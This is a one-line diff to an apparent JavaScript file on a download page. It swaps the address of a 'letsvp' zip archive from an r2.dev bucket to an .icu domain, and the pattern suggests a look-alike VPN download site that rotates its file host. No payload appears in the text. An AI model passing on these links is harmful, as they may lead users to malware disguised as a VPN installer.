@@ -1,6 +1,6 @@
  
 
-var xz = "download.html?file=https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/letsvp%20x64xisla.zip";
+var xz = "https://youdaoselw.icu/letsvp-spue.zip";
 
 
 
